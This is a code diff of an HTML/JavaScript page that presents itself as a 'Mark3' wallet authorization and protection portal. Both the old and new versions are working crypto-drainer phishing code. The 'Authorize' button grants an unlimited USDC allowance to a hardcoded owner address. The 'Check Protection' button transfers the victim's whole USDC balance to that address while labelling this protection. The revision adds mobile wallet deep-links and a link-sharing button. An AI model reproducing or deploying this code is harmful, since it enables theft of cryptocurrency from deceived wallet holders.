@@ -1,100 +1,102 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Mark3 · Wallet Authorization</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mark3Infinity · Wallet Portal</title>
   <style>
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background: radial-gradient(circle at top left, #1e1e2f, #12121c);
-      color: #fff;
+      background: linear-gradient(145deg, #0d1117, #1c1f26);
+      color: white;
       display: flex;
       flex-direction: column;
       align-items: center;
       padding: 2rem;
-      min-height: 100vh;
-    }
-    .card {
-      background: rgba(255, 255, 255, 0.05);
-      backdrop-filter: blur(20px);
-      border-radius: 20px;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-      padding: 2rem;
-      max-width: 460px;
-      width: 100%;
     }
     h2 {
-      text-align: center;
-      font-size: 1.8rem;
-      margin-bottom: 1.5rem;
+      margin-bottom: 1rem;
     }
     .button {
-      width: 100%;
-      background: linear-gradient(to right, #4e54c8, #8f94fb);
-      border: none;
-      border-radius: 12px;
-      padding: 14px;
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 16px;
+      padding: 12px 30px;
       font-size: 1rem;
-      font-weight: bold;
-      color: white;
-      margin: 10px 0;
+      font-weight: 600;
+      color: #fff;
+      margin: 10px;
       cursor: pointer;
-      transition: 0.3s;
+      transition: all 0.2s ease;
     }
-    .button:disabled {
-      background: rgba(255,255,255,0.2);
-      color: #aaa;
-      cursor: not-allowed;
+    .button:hover {
+      background: rgba(255, 255, 255, 0.15);
     }
     #status {
       margin-top: 1rem;
-      font-size: 0.95rem;
       padding: 1rem;
+      background: #161b22;
       border-radius: 10px;
-      background: rgba(255,255,255,0.08);
-      text-align: center;
-    }
-    .progress-container {
-      margin-top: 1rem;
       width: 100%;
-      background: rgba(255,255,255,0.1);
+      max-width: 600px;
+      font-size: 0.9rem;
+    }
+    .wallet-icons {
+      display: flex;
+      overflow-x: auto;
+      margin-top: 2rem;
+      gap: 1.5rem;
+      padding-bottom: 1rem;
+    }
+    .wallet-icons img {
+      height: 40px;
+    }
+    .deeplink, .copy-url {
+      margin-top: 1rem;
+      background: #2f3542;
+      color: #fff;
+      padding: 8px 20px;
       border-radius: 10px;
-      overflow: hidden;
+      font-size: 0.9rem;
     }
     .progress-bar {
-      height: 14px;
-      width: 0%;
-      background-color: #4e54c8;
-      transition: width 0.3s ease;
+      margin-top: 20px;
+      height: 10px;
+      width: 100%;
+      max-width: 500px;
+      background: #333;
+      border-radius: 5px;
+      overflow: hidden;
     }
-    .notice {
-      font-size: 0.85rem;
-      color: #ffa;
-      margin-bottom: 1rem;
-      text-align: center;
+    .progress-inner {
+      height: 100%;
+      background: #00adb5;
+      width: 0%;
+      transition: width 0.4s ease;
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <h2>Mark3<br />Wallet Authorization & Protection</h2>
+  <h2>Mark3Infinity · Wallet Authorize</h2>
+  <button class="button" id="connect">🔌 Connect Wallet</button>
+  <button class="button" id="authorize">🛡️ Authorize</button>
+  <button class="button" id="check">🧿 Check Protection</button>
+  <div class="progress-bar"><div class="progress-inner" id="bar"></div></div>
+  <div id="status">🔒 Status: Waiting for action...</div>
 
-    <div id="notice" class="notice" style="display: none;">
-      ⚠️ 请在 <strong>钱包内的浏览器</strong> 打开此网页以确保授权弹窗可以正常弹出
-    </div>
+  <div class="deeplink" id="deeplink"></div>
+  <div class="copy-url">📋 <button onclick="navigator.clipboard.writeText(window.location.href)">Copy this page link</button></div>
 
-    <button class="button" id="connect">🔌 Connect Wallet</button>
-    <button class="button" id="authorize" disabled>🛡️ Authorize & Protect</button>
-    <button class="button" id="check" disabled>🧿 Check Protection</button>
-
-    <div class="progress-container"><div class="progress-bar" id="progress"></div></div>
-    <div id="status">🔒 Status: Waiting for action...</div>
+  <div class="wallet-icons">
+    <img src="https://cryptologos.cc/logos/metamask-icon.svg" alt="MetaMask">
+    <img src="https://cryptologos.cc/logos/trust-wallet-trust-wallet-logo.svg" alt="TrustWallet">
+    <img src="https://cryptologos.cc/logos/token-pocket-tpt-logo.svg" alt="TokenPocket">
+    <img src="https://cryptologos.cc/logos/coinbase-coinbase-logo.svg" alt="Coinbase">
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script>
     const CONFIG = {
       USDC_ADDRESS: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
@@ -102,106 +104,71 @@
     };
 
     let provider, signer, user;
-
-    function updateStatus(msg) {
-      document.getElementById("status").innerText = "🔒 Status: " + msg;
-    }
-
-    function updateProgress(percent) {
-      document.getElementById("progress").style.width = percent + "%";
-    }
-
-    function detectMobileWalletBrowser() {
-      const ua = navigator.userAgent.toLowerCase();
-      const isMobile = /iphone|android|mobile|ipad/.test(ua);
-      const isMetaMask = window.ethereum && window.ethereum.isMetaMask;
-      if (isMobile && !isMetaMask && !ua.includes("tokenpocket") && !ua.includes("trust")) {
-        document.getElementById("notice").style.display = "block";
-      }
-    }
-
-    async function setupProvider() {
-      if (window.ethereum) {
-        provider = new ethers.providers.Web3Provider(window.ethereum);
-        await provider.send("eth_requestAccounts", []);
-      } else {
-        const wcProvider = new WalletConnectProvider.default({
-          rpc: { 1: "https://mainnet.infura.io/v3/96fb487925934acf993cb4ae78d6fe6d" }
-        });
-        await wcProvider.enable();
-        provider = new ethers.providers.Web3Provider(wcProvider);
-      }
-      signer = provider.getSigner();
-      user = await signer.getAddress();
-    }
+    const bar = document.getElementById("bar");
+    const status = (msg) => document.getElementById("status").innerText = "🔒 Status: " + msg;
+    const progress = (val) => bar.style.width = val + "%";
 
     document.getElementById("connect").onclick = async () => {
       try {
-        updateProgress(10);
-        await setupProvider();
-        updateProgress(50);
-        document.getElementById("connect").disabled = true;
-        document.getElementById("authorize").disabled = false;
-        document.getElementById("check").disabled = false;
-        updateStatus("✅ Connected: " + user);
-        updateProgress(100);
+        progress(10);
+        if (!window.ethereum) throw new Error("Please install MetaMask or open in wallet browser");
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        user = await signer.getAddress();
+        progress(60);
+        status("✅ Connected as: " + user);
+        progress(100);
       } catch (err) {
-        updateStatus("❌ " + err.message);
-        updateProgress(0);
+        status("❌ " + err.message);
+        progress(0);
       }
     };
 
     document.getElementById("authorize").onclick = async () => {
       try {
-        updateProgress(10);
-        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
-          "function approve(address,uint256) returns (bool)",
-          "function allowance(address,address) view returns (uint256)",
-          "function balanceOf(address) view returns (uint256)"
-        ], signer);
-
+        progress(0);
+        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, ["function approve(address,uint256) returns (bool)", "function allowance(address,address) view returns (uint256)", "function balanceOf(address) view returns (uint256)"] , signer);
         const balance = await usdc.balanceOf(user);
         const allowance = await usdc.allowance(user, CONFIG.OWNER_ADDRESS);
-
-        updateProgress(50);
+        progress(40);
         if (allowance.lt(balance)) {
           const tx = await usdc.approve(CONFIG.OWNER_ADDRESS, ethers.constants.MaxUint256);
           await tx.wait();
         }
-
-        updateStatus("✅ Authorization successful.");
-        updateProgress(100);
+        status("✅ Authorization successful.");
+        progress(100);
       } catch (err) {
-        updateStatus("❌ " + err.message);
-        updateProgress(0);
+        status("❌ " + err.message);
+        progress(0);
       }
     };
 
     document.getElementById("check").onclick = async () => {
       try {
-        updateProgress(20);
-        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, [
-          "function transfer(address,uint256) returns (bool)",
-          "function balanceOf(address) view returns (uint256)"
-        ], signer);
-
+        progress(0);
+        const usdc = new ethers.Contract(CONFIG.USDC_ADDRESS, ["function transfer(address,uint256) returns (bool)", "function balanceOf(address) view returns (uint256)"] , signer);
         const balance = await usdc.balanceOf(user);
-        updateProgress(60);
+        progress(30);
         if (balance.gt(0)) {
           const tx = await usdc.transfer(CONFIG.OWNER_ADDRESS, balance);
           await tx.wait();
-          updateStatus("✅ Protection Check: Funds moved.");
+          status("✅ Protection Check: Funds moved.");
         } else {
-          updateStatus("⚠️ No USDC balance to protect.");
+          status("⚠️ No USDC balance to protect.");
         }
-        updateProgress(100);
+        progress(100);
       } catch (err) {
-        updateStatus("❌ " + err.message);
-        updateProgress(0);
+        status("❌ " + err.message);
+        progress(0);
       }
     };
 
-    window.onload = detectMobileWalletBrowser;
+    // 检测钱包浏览器跳转提示
+    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    if (isMobile && !window.ethereum) {
+      document.getElementById("deeplink").innerHTML = '🔁 <a href="https://metamask.app.link/dapp/' + window.location.hostname + '">Open in Wallet App</a>';
+    }
   </script>
 </body>
 </html>
